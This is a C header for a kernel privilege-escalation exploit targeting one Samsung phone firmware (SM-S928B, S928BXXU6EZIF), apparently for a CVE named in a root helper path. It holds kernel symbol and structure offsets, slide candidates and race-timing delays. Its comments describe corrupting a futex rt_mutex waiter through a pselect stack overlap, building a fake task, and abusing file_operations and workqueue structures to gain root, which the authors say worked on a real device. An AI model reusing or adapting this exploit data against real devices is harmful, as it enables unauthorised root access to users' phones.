#ifndef E3Q_S928B_EZIF_LAYOUT_H
#define E3Q_S928B_EZIF_LAYOUT_H

/* SM-S928B S928BXXU6EZIF. Firmware-dependent symbols live in target.h.
 *
 * Offsets below were re-derived from the S928BXXU6EZIF Image: kallsyms for
 * symbols, BTF for structures, disassembly for the syscall frames.  Values
 * without that provenance are marked where they are defined.
 * P0_KERNEL_PHYS_LOAD has no offline proof yet.  See docs/PORT-STATUS.md. */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
/* memstart_addr, not "DRAM base".  util.c computes __pa() as
 * (linear_va - P0_PAGE_OFFSET) + P0_PHYS_OFFSET and p0_data_alias() inverts it,
 * so this must equal the kernel's memstart_addr or every computed alias lands
 * off by the difference.  /proc/zoneinfo on the live phone reports
 * `zone Normal start_pfn: 530144` = 0x816e0000, read identically before and
 * after a reboot, so it is stable and 0x80000000 was 23 MiB low - which is
 * exactly the kind of silent miss that makes a readback return an unrelated
 * page.  0x80000000 is the gunyah_hyp_region anchor from the vendor DTB, which
 * is a reserved carveout below the first RAM page, not where RAM starts. */
#define P0_PHYS_OFFSET 0x816e0000ULL
/* P0_KERNEL_PHYS_LOAD is an inherited candidate, not a measurement.
 *
 * A wrong value here mis-points both p0_data_alias() (the misc_fops readback)
 * and p0_alias_image_offset() (the physical-P0 slide).  It is the physical
 * address ABL/SPL loads the Image at, so it cannot be derived from memstart:
 * the device-validated DZF2 profile pairs 0xa8000000 with memstart 0x80000000
 * (+0x28000000), while this build's memstart is 0x816e0000, and adding the same
 * delta would give 0xa96e0000.  Read the load address out of this build's BL
 * archive before relying on either value.
 *
 * The live DTB does expose the same reserved-memory layout as DZF2
 * (gunyah_hyp_region@80000000, sec_xbl_ramdump@A7D00000, llcc_lpi_region@
 * ff800000), and 0xa8000000 falls in the free span above 0x9df00000, which is
 * why it is the candidate and not a guess from nothing. */
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define SKB_DATA_DELTA (-0x1000LL)
#define SLIDE_S928_SKB_DATA_DELTA (-0xe80LL)
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define APP_PHYS_P0_ORACLE 1
/* preload.c's attempt_delay_usec() indexes this list by attempt number and
 * exports the result as PSELECT_DELAY_USEC for the child, so one element meant
 * every one of the 24 attempts raced at exactly 50 ms.  The captured panic shows
 * why that matters: the fake waiter's lock pointer was read half-written
 * (ffffff80_42483c00 wanted, 00000006_42483c00 dereferenced), i.e. the window
 * was missed the same way every attempt.  Sweep outward from the 50 ms that
 * rooted this phone so a shifted window is found instead of re-missed. */
#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC \
  50000, 45000, 55000, 40000, 60000, 35000, \
  65000, 30000, 70000, 25000, 75000, 20000
#endif
/* BTF sizeof(mm_struct)=0x3c0; the observed mm slab object stride is 0x400. */
#define MM_STRUCT_SZ 0x400
#define SLIDE_WAITER_CORE 6
#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
#define COMPACT_RT_MUTEX_WAITER 1
#define SLIDE_TRACEFS_EVENT_ID 106
/* Measured on the SM-S928B reference unit:
 * /sys/kernel/tracing/events/sched/sched_blocked_reason/id == 106. */
/* This route leaves the waiter allocated by futex_wait_requeue_pi, not the
 * separate futex_lock_pi waiter.  In this Image rt_mutex_init_waiter points
 * the waiter's two rb-node self-addresses at futex_wait_requeue_pi.sp+0x98 and
 * +0xb0, and the chain __arm64_sys_futex (0x70) -> do_futex (0x60) ->
 * futex_wait_requeue_pi (0x1b0) puts that waiter at pt_regs-0x1e8.
 * __arm64_sys_pselect6 (0x90) calls core_sys_select (0x1c0) directly and its
 * fd_set_bits array is at core_sys_select.sp+0x50 = pt_regs-0x200, so global
 * fd-set word 3 lands on the waiter. */
#define SLIDE_PSELECT_WORD_SHIFT 3
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

/* These are app payload-placement parameters, not kernel BTF offsets. */
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC \
  50000, 50000, 50000, 50000, 50000, 50000, 50000, 50000
#define SLIDE_BANK_SLOTS 5
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_S928_BANK_TASK_STRIDE 0xa00
#define SLIDE_S928_BANK_LOCK_OWNER_TASK 1
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_S928_BANK_LOCK_BASE 0x0ea0
#define SLIDE_S928_BANK_LOCK_SHIFT 10
#define SLIDE_S928_BANK_LOCK_BUCKET_MASK 0x1f
#define SLIDE_S928_BANK_LOCK_MAX_BUCKET 27
#define SLIDE_S928_TASK_OFF_CANDIDATES 0x1000, 0x4000
#define FOPS_S928_TASK_OFF_CANDIDATES 0x1000, 0x6000, 0x7000
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_PRODUCTION_SLOT 4
#define SLIDE_S928_PROBE_PARENT_OFF 0x20
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#endif

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* EZIF BTF fields.  This Image carries a BTF blob and it confirms each offset
 * below, including rt_mutex_waiter's 0x58-byte layout. */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x924
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
